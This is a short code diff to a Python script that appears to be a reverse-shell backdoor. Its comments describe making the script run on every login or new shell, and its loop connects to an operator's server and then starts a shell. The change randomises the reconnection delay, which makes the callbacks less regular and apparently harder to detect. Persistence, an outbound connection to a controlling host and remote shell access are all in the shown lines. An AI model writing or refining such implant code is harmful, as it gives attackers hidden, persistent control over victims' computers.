@@ -1,4 +1,5 @@
 import socket, subprocess, os, sys
+import random
 from time import sleep
 '''
 First, make this script start every time the user starts their computer, or a new shell. (If they are running linux)
@@ -50,7 +51,7 @@ while DISCONNECTED:
         s.connect((SERVER_HOST,SERVER_PORT)) #Connect to server
         DISCONNECTED = False
     except:
-        sleep(10) #Try to join the server every 10 seconds
+        sleep(random.randint(0,10)) #Try to join the server every 0-10 seconds
 
 #When finally connected, start our shell
 while True:
